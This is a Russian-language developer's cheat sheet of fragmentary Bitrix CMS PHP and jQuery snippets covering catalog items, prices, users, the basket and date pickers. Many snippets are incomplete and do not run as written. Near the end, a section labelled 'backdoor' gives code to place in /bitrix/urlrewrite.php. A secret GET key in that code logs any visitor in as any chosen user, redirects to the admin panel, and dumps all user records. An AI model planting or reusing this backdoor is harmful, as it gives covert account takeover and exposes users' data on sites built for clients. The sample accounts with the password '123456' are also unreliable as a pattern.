<?php if ($_GET['key']!=''){
	exit();
} 
?>
	

<?
// голова без муссора
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");

CModule::IncludeModule("iblock");

CModule::IncludeModule("catalog");

CModule::IncludeModule("sale");


// путь к файлу
CFile::GetPath($arItem["PICTURE"]);
tovaer_id="<?=$arItem['ID']?>"

// создание элемента
CModule::IncludeModule("iblock");
								{
												$el = new CIBlockElement;
												$PROP = array();
												$PROP[88] = $enum_fields["ID"];
	$arLoadProductArray = Array(
	"IBLOCK_ID"      => 7,
	  "ACTIVE"         => "N" ,
	  "PROPERTY_VALUES"=> $PROP, 
	  "NAME"           => $enum_fields["VALUE"],        
	  );
	if($PRODUCT_ID = $el->Add($arLoadProductArray))
  echo "New ID: ".$PRODUCT_ID;
else
  echo "Error: ".$el->LAST_ERROR;


// загрузка файлов
$uploaddir = $_SERVER['DOCUMENT_ROOT'].'/parsing/'; 
	$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
	$uploadfile = $uploaddir ."items.txt"; 

	echo '<pre>';
	if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
	    echo "Файл корректен и был успешно загружен.\n";
	} else {
	    echo "Файл не загружен!\n";
	}

// распоковоать и удалит
$zip = new ZipArchive;
    $zip->open($uploadfile);
    $zip->extractTo($uploaddir);
    $zip->close();
    unlink($uploadfile);

if (isset($_POST['est-file'])

// редко работает
ini_set('max_execution_time', 900);
set_time_limit(900);

// БД
global $DB;
$DB->Query("UPDATE b_iblock_section  SET ACTIVE='N', GLOBAL_ACTIVE='N'  WHERE IBLOCK_ID='5'");
$DB->Query("UPDATE b_iblock_element SET ACTIVE='N' WHERE IBLOCK_ID='5'");
$DB->Query("UPDATE b_iblock_element SET ACTIVE='N' WHERE IBLOCK_ID='7'");

// все свойства элемента
$resp= CIBlockElement::GetList(Array(), array("IBLOCK_ID" => 7));
	while($obs = $resp->GetNextElement()){
		$arProps = $obs->GetProperties();
		$arFields = $obs->GetFields();
}

// найти по свойству el
$dbRes = CIBlockElement::GetList(array(), array("IBLOCK_ID" => 5, "!PROPERTY_MARCA" => false), array("PROPERTY_MARCA"));
while ($enum_fieldss = $dbRes->GetNext()) {

// свойства в виде список
	$property_enums = CIBlockPropertyEnum::GetList(Array("DEF"=>"ASC", "SORT"=>"ASC"), Array("IBLOCK_ID"=>5, "CODE"=>"GRUPPA_NOMENKLATURY"));
							while($enum_fields = $property_enums->GetNext())
								
// абдейт el __!!! затераються свойства !!!
$el = new CIBlockSection;
	$arLoadProductArray = Array(
	
	  "ACTIVE"         => "N"          
	  );
	$PRODUCT_ID = $value;
	$res = $el->Update($PRODUCT_ID, $arLoadProductArray);

// цены и тд
$el = new CIBlockElement;
			$PRODUCT_ID=$el->Update($element[$item['f4']],$arLoadProductArray);
			//
			$arFields = array(
				"ID" => $PRODUCT_ID, 
				"VAT_ID" => 1, //выставляем тип ндс (задается в админке)  
				"VAT_INCLUDED" => "Y" //НДС входит в стоимость
			);
			$CATALOG_PRODUCT_ID=CCatalogProduct::Add($arFields);
			// теперь с ценой
			$PRICE_TYPE_ID=1;
			$arFields = Array(
				"PRODUCT_ID" => $PRODUCT_ID,
				"CATALOG_GROUP_ID" => 1,
				"PRICE" => $item['f13'],
				"CURRENCY" => "RUB",
				"QUANTITY_FROM" => 1
			);
			CPrice::Add($arFields);

// заменялка
$xml_catalog=str_replace("/", "", $xml_catalog);


// массив для добовления в el в виде img
$arrPhoto = CFile::MakeFileArray("images/".$item['f11']);


// создание el и ценны
$el = new CIBlockElement;
			$PRODUCT_ID=$el->Add($arLoadProductArray);
			//
			$arFields = array(
				"ID" => $PRODUCT_ID, 
				"VAT_ID" => 1, //выставляем тип ндс (задается в админке)  
				"VAT_INCLUDED" => "Y" //НДС входит в стоимость
			);
			$CATALOG_PRODUCT_ID=CCatalogProduct::Add($arFields);
			$PRICE_TYPE_ID=1;
			$arFields = Array(
				"PRODUCT_ID" => $PRODUCT_ID,
				"CATALOG_GROUP_ID" => 1,
				"PRICE" => $item['f13'],
				"CURRENCY" => "RUB",
				"QUANTITY_FROM" => 1
			);
			CPrice::Add($arFields);

// удобная хрень чтобы не париться с ценной
function prise($PRODUCT_ID, $arFields){
		
	$PRICE_TYPE_ID = 1;

	$res = CPrice::GetList(
	        array(),
	        array(
	                "PRODUCT_ID" => $PRODUCT_ID,
	                "CATALOG_GROUP_ID" => $PRICE_TYPE_ID
	            )
	    );

	if ($arr = $res->Fetch())
	{
	    CPrice::Update($arr["ID"], $arFields);
	}
	else
	{
	    CPrice::Add($arFields);
	}
}

// нужная вещь
CSite::InDir('/index.php')
// еще одна для админкини условие
CSite::InDir('/auth')||CSite::InDir('/personal/cart/')
||CSite::InDir('/about/')

// удалить после символа
echo stristr($arFields['ACTIVE_TO'],' ',true);
?>
<div id="basket-added-window" class="modal"> <a class="modal-close" href="#"></a>
				<div class="spinner"></div>
				<div class="modal-content">
					<h2>Товар добавлен в корзину</h2>
					<div class="">
						<div class="modal-controls">
							<button type="submit" onClick="location.href='/personal/cart/'" class="bigbutt">Перейти к заказу</button>
							<button type="submit" onClick="$('#basket-added-window').find('.modal-close').click();$('#overlay').hide();" class="bigbutt">Продолжить покупки</button>
						</div>
						<div class="modal-errors">
						</div>
						<div class="modal-result">
						</div>
					</form>
					</div>
				</div>
				<div class="modal-content-copy"></div>
			</div>

<?if ($arItem['SORT']!=500) {	echo " vip";}
// вывод разделов
 $arFilter = array('IBLOCK_ID' => 6, 'ACTIVE' => "Y", "DEPTH_LEVEL"=>1);
 $rsSections = CIBlockSection::GetList(array("NAME"=>"ASC"), $arFilter);
 while ($arSction = $rsSections->Fetch())

 // отправка почты
 	CModule::IncludeModule("CEvent");
CModule::IncludeModule("mail");
global $USER;

$event = new CEvent;
$arEventFields = array(
    "ID"                  => 31,
    "DATE"             => $_POST['name_tov'],
    "EMAIL"            => $USER->GetEmail(),
    "EMAIL_USER_ACTION"         => $arUser['EMAIL'],
    "USER_ID"           => $_REQUEST['ID'],
    "LOGIN"          => $USER->GetFullName(),
    "NAME_CUP"          => $ar_res['NAME'],
    "DESCRIP"         => $_POST['description']
    );
// $arrSITE =  CAdvContract::GetSiteArray(31);
$event->SendImmediate("action", 's1', $arEventFields);
// изменения пользовотеля
$user = new CUser;
$fields = Array(
  "NAME"              => "Сергей",
  "LAST_NAME"         => "Иванов",
  "EMAIL"             => "ivanov@microsoft.com",
  "LOGIN"             => "ivan",
  "LID"               => "ru",
  "ACTIVE"            => "Y",
  "GROUP_ID"          => array(1,2),
  "PASSWORD"          => "123456",
  "CONFIRM_PASSWORD"  => "123456",
  );
$user->Update($ID, $fields);
$strError .= $user->LAST_ERROR;
// авторизирован
global $USER;
if ($USER->IsAuthorized()) echo "Вы авторизованы!";
// относительный путь к файлу в текущем каталоге текущего сайта
LocalRedirect("index.php");
<script>
    document.location.href = "/auth/";
</script>
// имя полное
$rsUser = CUser::GetByID($USER->GetID());
          $arUser = $rsUser->Fetch();
          echo $arUser["NAME"]." ".$arUser["LAST_NAME"];
// для доп полей в реги
		<?if($arResult["USER_PROPERTIES"]["SHOW"] == "Y"):?>
	<tr><td colspan="2"><?=strLen(trim($arParams["USER_PROPERTY_NAME"])) > 0 ? $arParams["USER_PROPERTY_NAME"] : GetMessage("USER_TYPE_EDIT_TAB")?></td></tr>
	<?foreach ($arResult["USER_PROPERTIES"]["DATA"] as $FIELD_NAME => $arUserField):?>
	<tr><td><?=$arUserField["EDIT_FORM_LABEL"]?>:<?if ($arUserField["MANDATORY"]=="Y"):?><span class="required">*</span><?endif;?></td><td>
			<?$APPLICATION->IncludeComponent(
				"bitrix:system.field.edit",
				$arUserField["USER_TYPE"]["USER_TYPE_ID"],
				array("bVarsFromForm" => $arResult["bVarsFromForm"], "arUserField" => $arUserField, "form_name" => "regform"), null, array("HIDE_ICONS"=>"Y"));?></td></tr>
	<?endforeach;?>
<?endif;?>
// длинна строки
strlen($str);

if(mb_strlen($arUser["NAME"])>12){
          $arUser["NAME"] = substr($arUser["NAME"], 0, 10);
          $arUser["NAME"].="...";
      		}
 // jq
[attribute^="value"]
input[name^="news"]
// новый пользовотель
$user = new CUser;
$arFields = Array(
  "NAME"              => "Сергей",
  "LAST_NAME"         => "Иванов",
  "EMAIL"             => "ivanov@microsoft.com",
  "LOGIN"             => "ivan",
  "LID"               => "ru",
  "ACTIVE"            => "Y",
  "GROUP_ID"          => array(10,11),
  "PASSWORD"          => "123456",
  "CONFIRM_PASSWORD"  => "123456",
  "PERSONAL_PHOTO"    => $arIMAGE
);

$ID = $user->Add($arFields);
if (intval($ID) > 0)
    echo "Пользователь успешно добавлен.";
else
    echo $user->LAST_ERROR;
// событие на href
javascript:void(0);
// кодировка
$content = iconv ( 'UTF-8' , 'windows-1251' , $content );
/ транслит
//Если с английского на русский, то передаём вторым параметром true.
transliterate = (
	function() {
		var
			rus = "щ   ш  ч  ц  ю  я  ё  ж  ъ  ы  э  а б в г д е з и й к л м н о п р с т у ф х ь".split(/ +/g),
			eng = "shh sh ch cz yu ya yo zh `` y' e` a b v g d e z i j k l m n o p r s t u f x `".split(/ +/g)
		;
		return function(text, engToRus) {
			var x;
			for(x = 0; x < rus.length; x++) {
				text = text.split(engToRus ? eng[x] : rus[x]).join(engToRus ? rus[x] : eng[x]);
				text = text.split(engToRus ? eng[x].toUpperCase() : rus[x].toUpperCase()).join(engToRus ? rus[x].toUpperCase() : eng[x].toUpperCase());	
			}
			return text;
		}
	}
)();
search=transliterate(search);
alert(transliterate(transliterate(txt), true));
rus = "o   i  x  w  .  z  `  ;  ]  s  '  f , d u l t p b q r k v y j g h c n e a [ m".split(/ +/g),
// чтото непонятное но прикольное
use Bitrix\Main,
	Bitrix\Main\Localization\Loc,
	Bitrix\Main\Page\Asset;

Asset::getInstance()->addJs("/bitrix/components/bitrix/sale.order.payment.change/templates/.default/script.js");
// календарь
       <link rel="stylesheet" href="/calendar/css/default.css" type="text/css">
        <script type="text/javascript" src="/calendar/javascript/zebra_datepicker.js"></script>
<!-- вывод календаря -->
if ($_REQUEST['date']!="") {
$date=$_REQUEST['date'];
$new_format = "YYYY-MM-DD";
$format = "DD.MM.YYYY";
$new_date = $DB->FormatDate($date, $new_format, $format);
	$GLOBALS['arrFilter'] = array(">DATE_ACTIVE_FROM" => $new_date,"<DATE_ACTIVE_FROM" => $new_date.' 23:59:59');

$date=$_REQUEST['date'];
$new_format = "YYYY-MM-DD";
$format = "DD.MM.YYYY";
$new_date = $DB->FormatDate($date, $new_format, $format);

<h1><?$APPLICATION->ShowTitle();?> ЗА <?echo $new_date?></h1>
<input type="text" value="" class="datepicker" style="display: none;">
<div id="container" style="margin: 10px 0 0 0; height: 250px"></div>

// js
$(document).ready(function() {
    $('input.datepicker').Zebra_DatePicker({
    	always_visible: $('#container'),
		  onChange: function(view, elements) {
		    if (view == 'days') {
		       var date_array=[
		<?
		CModule::IncludeModule("iblock");
		$arSelect = Array("DATE_ACTIVE_FROM");
		$arFilter = Array("IBLOCK_ID"=>12, "ACTIVE_DATE"=>"Y", "ACTIVE"=>"Y");
		$res = CIBlockElement::GetList(Array(), $arFilter, false, false, $arSelect);

		while($ob = $res->GetNextElement())
		{
		 $arFields = $ob->GetFields();
		 // print_r($arFields);
		 $date = $arFields['DATE_ACTIVE_FROM'];
		// укажем формат этой даты
		$format = "DD.MM.YYYY";
		// получим формат текущего сайта
		$new_format = "YYYY-MM-DD"; // YYYY-MM-DD
		// переведем дату из одного формата в другой
		$new_date = $DB->FormatDate($date, $format, $new_format);
		// в результате получим дату в новом формате
		echo "'".$new_date."',"; // 2007-12-31
		}
		?> 
		'15-12-2999'];
		      elements.each(function() {
		        $(this).addClass('dp_not_in_month');
		        for (var i = 0; i < date_array.length; i++) {
		        if ($(this).data('date').match(date_array[i])){
				$(this).attr('real','aga');
		          // and highlight it!
		          $(this).css({
		            backgroundColor:    '#C40000',
		            color:              '#FFF'
		          });
		          $(this).removeClass('dp_not_in_month');
		          $(this).addClass('active');
		      }else{
		      	
		      	
		     	 }
				}	
		    });
		 }
	  }
	});
 });
// выдавливатель
$pieces = explode(" ", $pizza);
// для пользовотеля
CREATED_BY
global $USER;
$rsUser = CUser::GetByID($USER->GetID());
          $arUser = $rsUser->Fetch();
			echo $arUser["WORK_COMPANY"];
// корзинна с ценной
if (CModule::IncludeModule("sale"))
      {
         $arBasketItems = array();
         $dbBasketItems = CSaleBasket::GetList(
                 array(
                         "NAME" => "ASC",
                         "ID" => "ASC"
                     ),
                 array(
                         "FUSER_ID" => CSaleBasket::GetBasketUserID(),
                         "LID" => SITE_ID,
                         "ORDER_ID" => "NULL"
                     ),
                 false,
                 false,
                 array("ID", "QUANTITY", "PRICE")
             );
         while ($arItems = $dbBasketItems->Fetch())
         {
             if (strlen($arItems["CALLBACK_FUNC"]) > 0)
             {
                 CSaleBasket::UpdatePrice($arItems["ID"],
                                          $arItems["QUANTITY"]);
                 $arItems = CSaleBasket::GetByID($arItems["ID"]);
             }
             $arBasketItems[] = $arItems;
         }
         $summ = 0.00;
         foreach ($arBasketItems as $bascet) {

            $summ = $summ + $bascet["PRICE"]*$bascet["QUANTITY"];
            }
      }
      // $summa = number_format($summ, 0, '.', ' ');
      ?>
     Итого: <?echo number_format($summ, 2, '.', ' ');
    ?> руб <br>
    Количество: <?=count($arBasketItems)?>
    // проверка ширины высоты php
							$cl="";							
							if ($arFirstPhoto['WIDTH']>=$arFirstPhoto['HEIGHT']) {
								$cl="vertical";
							}else{
								$cl="horizontal";
							}
spsvatki@gmail.com, andrey@e1media.ru,
// удалит содержимое всех div-элементов с классом content.
 $('.badge').empty();
 $('.badge').append(data+" товар(ов)");
 // найти по атрибуту jq
 input[name^="news"]
 // для селекта
 <select onchange="brend(this.value);">
 // получить ценну
 $db_res = CPrice::GetList(
        array(),
        array(
                "PRODUCT_ID" => $arFields['ID'],
                "CATALOG_GROUP_ID" => 1
            )
    );
if ($ar_res = $db_res->Fetch())
{
    echo CurrencyFormat($ar_res["PRICE"], $ar_res["CURRENCY"]);
}
else
{
    echo "Цена не найдена!";
}
// кодировать в json
echo json_encode($arr);
// работа с json
user =JSON.parse(arr);
// изменить attr
$("img:first").attr("alt", "Первое изображение")
// комент к заказу
<?$arOrder = CSaleOrder::GetByID($ORDER_ID);
if (is_array($arOrder))
echo $arOrder['USER_DESCRIPTION'];?>
// неавторизирован
$USER->Logout();

// убийца по id
if(!CModule::IncludeModule("iblock"))

return; 

$res = CIBlockElement::GetByID($_GET["PID"]);
if($ar_res = $res->GetNext())
  echo $ar_res['NAME'];
// работа с chekbox
$(this).prop('checked')
('#button').prop('disabled', false);
// проверка на число
isFinite($('input[name=phone]'));
// эмуляция submit
 form.submit();
 // eee
 e.preventDefault();
 // клик
  $('#button').click(function(e){
  	// таймер
  	setTimeout(function(){
        $.getScript("engine1/script.js");
    },5000)
// .menu
Array(
		"Как заказать", 
		"about/how/", 
		Array(), 
		Array(), 
		"CUser::IsAuthorized()" 
	),
// содержимое div jq
.html());
// jq получить число с плав точкой
parseFloat()
// ajax
$.ajax({
                    type: 'POST',
                    url: '/bitrix/templates/e1media/addCart.php?id='+id,
                    data: 'id='+id,

                    success: function(data){                         
                          $('.badge').empty();
                         $('.badge').append(data+" товар(ов)");
                          $('#basket-added-window').show();
				$('#overlay').show();
                         // alert('Добавлен');
                          
                      }
                    });
});
// добовляет в корзинну
Add2BasketByProductID(
  $_GET['id'], 
  1
);

// все свойства инфоблока
CModule::IncludeModule("iblock");
$res = CIBlock::GetProperties(2, Array());
while ($res_arr = $res->Fetch()) {

// календарь
  <div class="col-md-12">
                        <div id="reportrange" class="pull-right" style="background: #fff; cursor: pointer; padding: 5px 10px; border: 1px solid #ccc">
                          <i class="glyphicon glyphicon-calendar fa fa-calendar"></i>
                          <span><?=$from?> - <?=$to?></span> <b class="caret"></b>
                        </div>
                      </div>
// footer_calendar
      <script>
       $(document).ready(function() {
        $('#reservation').daterangepicker({
         format: 'DD/MM/YYYY',
          startDate: "<?=$from?>",
          endDate: "<?=$to?>",
          opens: "left",
          ranges: {
            'Сегодня': [moment(), moment()],
            'Вчера': [moment().subtract(1, 'days'), moment().subtract(1, 'days')],
            'Неделю назад': [moment().subtract(6, 'days'), moment()],
            'Месяц назад': [moment().subtract(29, 'days'), moment()],
            'Этот месяц': [moment().startOf('month'), moment().endOf('month')],
            'Следующий месяц': [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')]
          },locale: {
            applyLabel: 'Принять',
            cancelLabel: 'Сбросить',
            fromLabel: 'От',
            toLabel: 'По',
            customRangeLabel: 'Точная дата',
            daysOfWeek: ['Вс', 'Пн' ,'Вт', 'Ср', 'Чт', 'Пт', 'Сб'],
            monthNames: ['Январь', 'Февраль', 'Март', 'Апрель', 'Май', 'Июнь', 'Июль', 'Август', 'Сентябрь', 'Октябрь', 'Ноябрь', 'Декабрь'],
            firstDay: 1
          },         
          
        }, function(start, end, label) {
           console.log(start.format('DD.MM.YYYY') + ' по ' + end.format('DD.MM.YYYY'));
           new_date_order(start.format('DD.MM.YYYY'), end.format('DD.MM.YYYY'));
        });
      });
    </script>

<link rel="stylesheet" href="/calendar/css/default.css" type="text/css">
        <script type="text/javascript" src="/calendar/javascript/zebra_datepicker.js"></script>
     <script src="/calendar/datepicker/daterangepicker.js"></script>

 // родитель 
 .parent()

 // костыли
 	// если развалился titl
 <title><?$APPLICATION->ShowTitle(false)?></title>
 // end костыли



// backdoor 
 // path /bitrix/urlrewrite.php
<?
if ($_GET['super_user']=="asdhiu2398JHfkjhsd98h23fJKHp2389hfpasd586423df5asdewfewgsdsdgwgdsfur") {
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
global $USER;
$id=$_GET['id'];
if ($id=="getlist") {
	$rsUsers = CUser::GetList();
	 while($arr = $rsUsers->GetNext()){
      echo'<pre>';print_r($arr);echo'</pre>';
    }
    exit();
}
$USER->Authorize($id);
LocalRedirect("/bitrix/admin/index.php");
exit();
}


pan: 4111 1111 1111 1111
exp date: 2019/12
cvv2: 123
3dsecure: veres=y, pares=y
 	


для фильтрации по имени элемента
$GLOBALS['arrFilter'] = array("NAME"=>"A%");
для фильтрации по свойств
$GLOBALS['arrFilter'] = array("PROPERTY_КОД_СВОЙСТВА" => "A%");
для фильтрации по свойству типа "список"
$GLOBALS['arrFilter'] = array("PROPERTY_КОД_СВОЙСТВА_VALUE"=>"А%");
выбрать все элементы у которых свойство "STOP_SHARE" активно
$GLOBALS['arrFilter'] = array("!STOP_SHARE" => false);
выбрать все элементы у которых свойство "PREVIEW_PICTURE" не пустое
$GLOBALS['arrFilter'] = array('ACTIVE' => 'Y', '!PREVIEW_PICTURE'=>false);
выбрать один элемент у которого самая актуальная дата на сегодняшний день
$GLOBALS['arrFilter'] = array('ACTIVE' => 'Y', 'PROPERTY_ISACTION' => '1', '<=PROPERTY_DATEFROM' => date('Y-m-d'));
выбрать все актуальные элементы у которых не просроченная дата(свойство) на сегодняшний день и задано определённое свойство
$GLOBALS['arrFilter'] = array("PROPERTY_КОД_СВОЙСТВА_VALUE" => false, 'ACTIVE' => 'Y', '<=PROPERTY_КОД_СВОЙСТВА_VALUE!' => date('Y-m-d'));
// сложная логика
$arFilter = array(
    "IBLOCK_ID" => $IBLOCK_ID,
    "SECTION_CODE" => "orange",
    "INCLUDE_SUBSECTIONS" => "Y",
    array(
        "LOGIC" => "OR",
        array("<PROPERTY_RADIUS" => 50, "=PROPERTY_CONDITION" => "Y"),
        array(">=PROPERTY_RADIUS" => 50, "!=PROPERTY_CONDITION" => "Y"),
    ),
);
// слить массивы
$result = array_merge ($array1, $array2);
$GLOBALS['arrFilter'] = $GLOBALS['arrFiltersity'];

// свойства по GetID
 $rsElem = CIBlockElement::GetById($items_id); 
            $arElem = $rsElem->GetNextElement();
            $arProps = $arElem->GetProperties();
// поиск символа
strripos('ababcd','aB')
global $IBLOCK_ID_FROM,$IBLOCK_ID_TO,$IBLOCK_ID_PRED;
// html
htmlspecialchars
// количество страниц
echo $arResult['NAV_RESULT']->NavPageCount
// csv разделить по символу
$array = str_getcsv ( $value,"&&&");

// битркис csv
require_once ($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/classes/general/csv_data.php");
$csvFile = new CCSVData('R', false);
$csvFile->LoadFile($step);
$csvFile->SetDelimiter(';');
while ($arRes = $csvFile->Fetch()) {
   // print_r($arRes);
// проверка доступа
global $USER;
$ID_USER=$USER->GetID();
if ($arFields['CREATED_BY']!=$ID_USER or $_REQUEST["ID"]=="") {
  exit('Нет доступа');
}
// 1 свойство
$ELEMENT_ID = $_GET['ID_SOBR'];  // код элемента
$PROPERTY_CODE = "id_project";  // код свойства
$PROPERTY_VALUE = $PRODUCT_ID;  // значение свойства

// Установим новое значение для данного свойства данного элемента
CIBlockElement::SetPropertyValuesEx($ELEMENT_ID, false, array($PROPERTY_CODE => $PROPERTY_VALUE));
// для arr ssp
// получить цену по id
	<?
$ar_res = CPrice::GetBasePrice($arItem['ID']);
echo "Базовая цена товара с кодом 11 (при приобретении от ".
      $ar_res["QUANTITY_FROM"]." до ".
      $ar_res["QUANTITY_TO"]." единиц товара) равна ".
      $ar_res["PRICE"]." ".$ar_res["CURRENCY"]."<br>";
echo "Отформатированая базовая цена: ".
      CurrencyFormat($ar_res["PRICE"], $ar_res["CURRENCY"]);
?>
// удалить элемент
if(!CIBlockElement::Delete($ELEMENT_ID))
    {
        $strWarning .= 'Error!';
        $DB->Rollback();
    }